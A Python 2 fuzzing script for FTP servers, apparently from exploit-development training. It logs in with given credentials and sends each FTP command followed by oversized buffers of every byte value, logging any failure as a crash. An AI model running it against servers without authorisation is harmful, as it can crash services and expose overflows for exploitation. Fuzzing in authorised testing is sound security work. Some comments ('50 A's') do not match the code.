# Import the required modulees the script will leverage
# This lets us use the functions in the modules instead of writing the code from scratch
import sys, socket
from time import sleep


cmdList = [ "!", "dir", "mdelete", "qc", "site","$","disconnect","mdir","sendport", 
           "size","account","exit", "mget","put","status","append","form","mkdir", 
           "pwd","struct","ascii","get","mls", "quit","system","bell","glob","mode", 
           "quote","sunique", "binary","hash","modtime","recv", "tenex", "bye", 
           "help", "mput", "reget", "tick","case", "idle","newer","rstatus","trace", 
           "cd", "image", "nmap", "rhelp", "type", "cdup", "ipany", "nlist", "rename", 
           "user","chmod", "ipv4", "ntrans", "reset", "umask", "close", "ipv6", "open", 
           "restart", "verbose", "cr", "lcd", "prompt", "rmdir", "?", "delete", "ls", 
           "passive", "runique", "debug", "macdef", "proxy", "send"]

# set first argument given at CLI to 'target' variable
target = sys.argv[1]
user = sys.argv[2]
passw = sys.argv[3]

# create string of 50 A's '\x41'
# buff = '\x41'*50



# loop through sending in a buffer with an increasing length by 50 A's

firstTime = True
for cmd in cmdList:
   for c in range(0,255):
      my_char = chr(c)
      print "char( " + str(c) + "): " + my_char 
      buff = my_char * 1000

      for x in range(0,5):
        # The "try - except" catches the programs error and takes our defined action
        try:

          # OPEN SOCKET ==================================== 
          s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
          s.settimeout(2)
          s.connect((target,21))
          data = s.recv(1024)
          print '%s\r\n'%data

          # LOGIN ==========================================
          s.send("USER " + user + "\r\n")  
          data = s.recv(1024)
          print '%s\n'%data

          s.send("PASS " + passw + "\r\n")          
          data = s.recv(1024)
          print '%s\n'%data

          if firstTime is True:
            sleep(3)
            firstTime = False

          # SEND PAYLOAD ===================================
          payload = cmd + " " + buff + "\r\n"
          print "char: chr(" + str(c) + ")\n"
          print "Send (" + str(len(payload)) + "): " + payload

          s.send(payload)
  
          #sleep(1)
 
          # Quit connection
          s.send('QUIT\r\n')
          s.close()

          # Increase the buff string by 50 A's and then the loop continues
          buff = buff + (my_char*2000)

        except: # If we fail to connect to the server, we assume its crashed and print the statement below
          errMsg = "[+] Crash occured with cmd: " + cmd + ";char: chr(" + str(c) + ") = " + my_char + "; length: "+ str(len(buff)-50) + "\r\n"
          print errMsg
          file = open("crashes.txt","a") 
          file.write(errMsg)
          file.close() 
          #sys.exit()




